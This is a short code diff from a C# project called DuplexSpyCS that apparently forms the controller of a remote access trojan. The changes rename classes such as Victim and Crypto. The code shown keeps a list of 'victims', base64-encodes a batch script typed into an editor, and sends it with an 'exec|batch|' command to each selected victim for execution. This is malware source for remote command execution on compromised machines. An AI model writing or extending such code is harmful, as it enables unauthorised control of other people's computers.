@@ -15,7 +15,7 @@ namespace DuplexSpyCS
     {
         private TextEditorControl editor;
 
-        public List<Victim> lsVictim;
+        public List<clsVictim> lsVictim;
         private readonly string[] lvColumns =
         {
             "ID",
@@ -31,11 +31,11 @@ namespace DuplexSpyCS
         {
             string type = null;
             string script = editor.Text;
-            string b64Script = Crypto.b64E2Str(script);
+            string b64Script = clsCrypto.b64E2Str(script);
 
             foreach (ListViewItem item in listView1.CheckedItems)
             {
-                Victim v = (Victim)item.Tag;
+                clsVictim v = (clsVictim)item.Tag;
                 v.encSend(2, 0, "exec|batch|" + b64Script);
             }
         }
@@ -58,7 +58,7 @@ namespace DuplexSpyCS
                 listView1.Columns.Add(header);
             }
 
-            foreach (Victim victim in lsVictim)
+            foreach (clsVictim victim in lsVictim)
             {
                 ListViewItem item = new ListViewItem(victim.ID);
                 item.Tag = victim;
